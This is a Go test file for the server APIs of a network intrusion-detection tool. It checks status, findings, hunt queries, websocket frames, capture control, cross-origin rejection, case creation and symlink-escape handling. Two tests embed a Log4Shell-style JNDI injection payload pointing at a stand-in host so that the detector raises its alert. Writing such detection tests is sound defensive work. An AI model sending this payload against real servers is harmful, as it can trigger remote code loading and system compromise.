package server

import (
	"bufio"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"netprobe-ir/internal/capture"
	"netprobe-ir/internal/config"
	"netprobe-ir/internal/model"
	"netprobe-ir/internal/pipeline"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestStatusAndFlowsAPI(t *testing.T) {
	c := config.Default()
	c.DataDir = t.TempDir()
	c.Recorder.Enabled = false
	e := pipeline.New(c)
	e.ProcessFrame(capture.Frame{Time: time.Now(), Interface: "test0", Direction: model.DirectionOutbound, Data: httpFrame()})
	s := httptest.NewServer(New(e, "").Handler())
	defer s.Close()
	for _, p := range []string{"/api/v1/status", "/api/v1/flows", "/api/v1/packets", "/api/v1/processes", "/api/v1/findings", "/api/v1/hunt?q=app:http", "/api/v1/report.json", "/metrics"} {
		r, er := s.Client().Get(s.URL + p)
		if er != nil {
			t.Fatal(er)
		}
		if r.StatusCode != 200 {
			t.Fatalf("%s status=%d", p, r.StatusCode)
		}
		r.Body.Close()
	}
}
func TestAuth(t *testing.T) {
	c := config.Default()
	c.DataDir = t.TempDir()
	c.Recorder.Enabled = false
	e := pipeline.New(c)
	srv := httptest.NewServer(New(e, "secret").Handler())
	defer srv.Close()
	r, _ := srv.Client().Get(srv.URL + "/api/v1/status")
	if r.StatusCode != 401 {
		t.Fatalf("expected 401 got %d", r.StatusCode)
	}
	r.Body.Close()
	req, _ := http.NewRequest("GET", srv.URL+"/api/v1/status", nil)
	req.Header.Set("Authorization", "Bearer secret")
	r, err := srv.Client().Do(req)
	if err != nil {
		t.Fatal(err)
	}
	if r.StatusCode != 200 {
		t.Fatalf("authorized status=%d", r.StatusCode)
	}
	r.Body.Close()
}

func TestWebSocketStatusFrame(t *testing.T) {
	c := config.Default()
	c.DataDir = t.TempDir()
	c.Recorder.Enabled = false
	eng := pipeline.New(c)
	srv := httptest.NewServer(New(eng, "").Handler())
	defer srv.Close()
	u, _ := url.Parse(srv.URL)
	conn, err := net.Dial("tcp", u.Host)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(3 * time.Second))
	key := "dGhlIHNhbXBsZSBub25jZQ=="
	fmt.Fprintf(conn, "GET /ws HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Key: %s\r\n\r\n", u.Host, key)
	br := bufio.NewReader(conn)
	line, err := br.ReadString('\n')
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(line, "101") {
		t.Fatalf("upgrade failed: %s", line)
	}
	for {
		l, e := br.ReadString('\n')
		if e != nil {
			t.Fatal(e)
		}
		if l == "\r\n" {
			break
		}
	}
	b0, e := br.ReadByte()
	if e != nil {
		t.Fatal(e)
	}
	b1, e := br.ReadByte()
	if e != nil {
		t.Fatal(e)
	}
	if b0&0x0f != 1 {
		t.Fatalf("opcode=%d", b0&0x0f)
	}
	n := int(b1 & 0x7f)
	if n == 126 {
		a, _ := br.ReadByte()
		b, _ := br.ReadByte()
		n = int(a)<<8 | int(b)
	} else if n == 127 {
		var z [8]byte
		if _, e := io.ReadFull(br, z[:]); e != nil {
			t.Fatal(e)
		}
		n = int(binary.BigEndian.Uint64(z[:]))
	}
	payload := make([]byte, n)
	if _, e := io.ReadFull(br, payload); e != nil {
		t.Fatal(e)
	}
	var v map[string]any
	if e := json.Unmarshal(payload, &v); e != nil {
		t.Fatal(e)
	}
	if _, ok := v["status"]; !ok {
		t.Fatalf("missing status: %s", payload)
	}
}
func httpFrame() []byte { return httpFramePayload("GET / HTTP/1.1\r\nHost: local\r\n\r\n") }

func httpFramePayload(payload string) []byte {
	p := []byte(payload)
	n := 20 + 20 + len(p)
	b := make([]byte, 14+n)
	binary.BigEndian.PutUint16(b[12:14], 0x0800)
	o := 14
	b[o] = 0x45
	binary.BigEndian.PutUint16(b[o+2:o+4], uint16(n))
	b[o+9] = 6
	b[o+8] = 64
	copy(b[o+12:o+16], []byte{127, 0, 0, 1})
	copy(b[o+16:o+20], []byte{1, 1, 1, 1})
	q := o + 20
	binary.BigEndian.PutUint16(b[q:q+2], 50000)
	binary.BigEndian.PutUint16(b[q+2:q+4], 80)
	b[q+12] = 0x50
	b[q+13] = 0x18
	copy(b[q+20:], p)
	return b
}

func TestPacketDetailAPI(t *testing.T) {
	c := config.Default()
	c.DataDir = t.TempDir()
	c.Recorder.Enabled = false
	e := pipeline.New(c)
	e.ProcessFrame(capture.Frame{Time: time.Now(), Interface: "test0", Direction: model.DirectionOutbound, Data: httpFrame()})
	s := httptest.NewServer(New(e, "").Handler())
	defer s.Close()
	r, err := s.Client().Get(s.URL + "/api/v1/packets?limit=10")
	if err != nil {
		t.Fatal(err)
	}
	defer r.Body.Close()
	var packets []model.PacketSummary
	if err := json.NewDecoder(r.Body).Decode(&packets); err != nil {
		t.Fatal(err)
	}
	if len(packets) != 1 {
		t.Fatalf("packets=%d", len(packets))
	}
	if packets[0].FlowID == "" {
		t.Fatal("packet missing flow id")
	}
	r2, err := s.Client().Get(s.URL + "/api/v1/packets/" + packets[0].ID)
	if err != nil {
		t.Fatal(err)
	}
	defer r2.Body.Close()
	if r2.StatusCode != http.StatusOK {
		t.Fatalf("detail status=%d", r2.StatusCode)
	}
}

func TestSecurityFindingAndHuntAPI(t *testing.T) {
	c := config.Default()
	c.DataDir = t.TempDir()
	c.Recorder.Enabled = false
	e := pipeline.New(c)
	e.ProcessFrame(capture.Frame{Time: time.Now(), Interface: "test0", Direction: model.DirectionOutbound, Data: httpFramePayload("GET /?x=${jndi:ldap://bad.example/a} HTTP/1.1\r\nHost: target.example\r\n\r\n")})
	s := httptest.NewServer(New(e, "").Handler())
	defer s.Close()

	r, err := s.Client().Get(s.URL + "/api/v1/findings?limit=20")
	if err != nil {
		t.Fatal(err)
	}
	defer r.Body.Close()
	var findings []model.SecurityFinding
	if err := json.NewDecoder(r.Body).Decode(&findings); err != nil {
		t.Fatal(err)
	}
	if len(findings) == 0 || findings[0].RuleID != "NP-IDS-1201" {
		t.Fatalf("findings=%#v", findings)
	}

	r2, err := s.Client().Get(s.URL + "/api/v1/findings/" + findings[0].ID)
	if err != nil {
		t.Fatal(err)
	}
	defer r2.Body.Close()
	if r2.StatusCode != http.StatusOK {
		t.Fatalf("finding detail status=%d", r2.StatusCode)
	}

	r3, err := s.Client().Get(s.URL + "/api/v1/hunt?q=" + url.QueryEscape("app:http severity:critical rule:NP-IDS-1201"))
	if err != nil {
		t.Fatal(err)
	}
	defer r3.Body.Close()
	var hunt pipeline.HuntResult
	if err := json.NewDecoder(r3.Body).Decode(&hunt); err != nil {
		t.Fatal(err)
	}
	if hunt.Counts["findings"] == 0 {
		t.Fatalf("hunt counts=%#v", hunt.Counts)
	}
}

func TestCaptureControlAPI(t *testing.T) {
	c := config.Default()
	c.DataDir = t.TempDir()
	c.Recorder.Enabled = false
	e := pipeline.New(c)
	s := httptest.NewServer(New(e, "").Handler())
	defer s.Close()

	r, err := s.Client().Get(s.URL + "/api/v1/control/stop")
	if err != nil {
		t.Fatal(err)
	}
	r.Body.Close()
	if r.StatusCode != http.StatusMethodNotAllowed {
		t.Fatalf("GET stop status=%d", r.StatusCode)
	}

	req, _ := http.NewRequest(http.MethodPost, s.URL+"/api/v1/control/stop", strings.NewReader("{}"))
	r, err = s.Client().Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer r.Body.Close()
	if r.StatusCode != http.StatusOK {
		t.Fatalf("POST stop status=%d", r.StatusCode)
	}

	badReq, _ := http.NewRequest(http.MethodPost, s.URL+"/api/v1/control/stop", strings.NewReader("{}"))
	badReq.Header.Set("Origin", "https://attacker.example")
	badResp, err := s.Client().Do(badReq)
	if err != nil {
		t.Fatal(err)
	}
	badResp.Body.Close()
	if badResp.StatusCode != http.StatusForbidden {
		t.Fatalf("cross-origin status=%d", badResp.StatusCode)
	}
}

func TestModernConsoleAssets(t *testing.T) {
	c := config.Default()
	c.DataDir = t.TempDir()
	c.Recorder.Enabled = false
	e := pipeline.New(c)
	s := httptest.NewServer(New(e, "").Handler())
	defer s.Close()
	for path, want := range map[string]string{
		"/":        "Security Findings",
		"/app.css": "--surface:#ffffff",
		"/app.js":  "interfaceControl",
	} {
		r, err := s.Client().Get(s.URL + path)
		if err != nil {
			t.Fatal(err)
		}
		b, _ := io.ReadAll(r.Body)
		r.Body.Close()
		if r.StatusCode != http.StatusOK {
			t.Fatalf("%s status=%d", path, r.StatusCode)
		}
		if !strings.Contains(string(b), want) {
			t.Fatalf("%s missing %q", path, want)
		}
	}
}

func TestV040InvestigationCaseAndResponseAPIs(t *testing.T) {
	c := config.Default()
	c.DataDir = t.TempDir()
	c.Recorder.Enabled = false
	c.Response.Enabled = true
	c.Response.DryRun = true
	e := pipeline.New(c)
	e.ProcessFrame(capture.Frame{Time: time.Now(), Interface: "test0", Direction: model.DirectionOutbound, Data: httpFramePayload("GET /?x=${jndi:ldap://bad/a} HTTP/1.1\r\nHost: target\r\n\r\n")})
	s := httptest.NewServer(New(e, "").Handler())
	defer s.Close()
	for _, p := range []string{"/api/v1/graph", "/api/v1/threat-intel", "/api/v1/baseline", "/api/v1/cases", "/api/v1/sensors"} {
		r, err := s.Client().Get(s.URL + p)
		if err != nil {
			t.Fatal(err)
		}
		r.Body.Close()
		if r.StatusCode != 200 {
			t.Fatalf("%s=%d", p, r.StatusCode)
		}
	}
	fs := e.Findings(10)
	if len(fs) == 0 {
		t.Fatal("missing finding")
	}
	body := strings.NewReader(fmt.Sprintf(`{"finding_id":%q,"window_seconds":60}`, fs[0].ID))
	r, err := s.Client().Post(s.URL+"/api/v1/cases", "application/json", body)
	if err != nil {
		t.Fatal(err)
	}
	var cs map[string]any
	if err = json.NewDecoder(r.Body).Decode(&cs); err != nil {
		t.Fatal(err)
	}
	r.Body.Close()
	if r.StatusCode != 200 || cs["id"] == nil {
		t.Fatalf("case=%v status=%d", cs, r.StatusCode)
	}
	respBody := strings.NewReader(`{"action":"block_ip","ip":"203.0.113.9","ttl_seconds":60}`)
	r, err = s.Client().Post(s.URL+"/api/v1/response", "application/json", respBody)
	if err != nil {
		t.Fatal(err)
	}
	var rr map[string]any
	json.NewDecoder(r.Body).Decode(&rr)
	r.Body.Close()
	if r.StatusCode != 200 || rr["dry_run"] != true {
		t.Fatalf("response=%v status=%d", rr, r.StatusCode)
	}
}

func TestReplayAndDetectionLabAPIs(t *testing.T) {
	c := config.Default()
	c.DataDir = t.TempDir()
	c.Recorder.Enabled = false
	pcapPath := filepath.Join(c.DataDir, "replay", "sample.pcap")
	if err := os.MkdirAll(filepath.Dir(pcapPath), 0750); err != nil {
		t.Fatal(err)
	}
	if err := writeTestPCAP(pcapPath, httpFramePayload("GET / HTTP/1.1\r\nHost: replay.local\r\n\r\n")); err != nil {
		t.Fatal(err)
	}
	e := pipeline.New(c)
	s := httptest.NewServer(New(e, "").Handler())
	defer s.Close()
	for _, ep := range []string{"/api/v1/replay", "/api/v1/lab/run"} {
		r, err := s.Client().Post(s.URL+ep, "application/json", strings.NewReader(`{"path":"replay/sample.pcap"}`))
		if err != nil {
			t.Fatal(err)
		}
		b, _ := io.ReadAll(r.Body)
		r.Body.Close()
		if r.StatusCode != 200 {
			t.Fatalf("%s status=%d body=%s", ep, r.StatusCode, b)
		}
	}
}

func TestAllowedFileRejectsSymlinkEscape(t *testing.T) {
	c := config.Default()
	c.DataDir = t.TempDir()
	c.Recorder.Enabled = false
	outside := filepath.Join(t.TempDir(), "outside.pcap")
	os.WriteFile(outside, []byte("x"), 0600)
	link := filepath.Join(c.DataDir, "replay", "escape.pcap")
	os.MkdirAll(filepath.Dir(link), 0750)
	if err := os.Symlink(outside, link); err != nil {
		t.Skip(err)
	}
	e := pipeline.New(c)
	s := New(e, "")
	if _, err := s.allowedFile("replay/escape.pcap", false); err == nil {
		t.Fatal("symlink escape accepted")
	}
}

func writeTestPCAP(path string, frame []byte) error {
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()
	h := make([]byte, 24)
	binary.LittleEndian.PutUint32(h[0:4], 0xa1b2c3d4)
	binary.LittleEndian.PutUint16(h[4:6], 2)
	binary.LittleEndian.PutUint16(h[6:8], 4)
	binary.LittleEndian.PutUint32(h[16:20], 65535)
	binary.LittleEndian.PutUint32(h[20:24], 1)
	if _, err = f.Write(h); err != nil {
		return err
	}
	ph := make([]byte, 16)
	now := time.Now()
	binary.LittleEndian.PutUint32(ph[0:4], uint32(now.Unix()))
	binary.LittleEndian.PutUint32(ph[4:8], uint32(now.Nanosecond()/1000))
	binary.LittleEndian.PutUint32(ph[8:12], uint32(len(frame)))
	binary.LittleEndian.PutUint32(ph[12:16], uint32(len(frame)))
	if _, err = f.Write(ph); err != nil {
		return err
	}
	_, err = f.Write(frame)
	return err
}
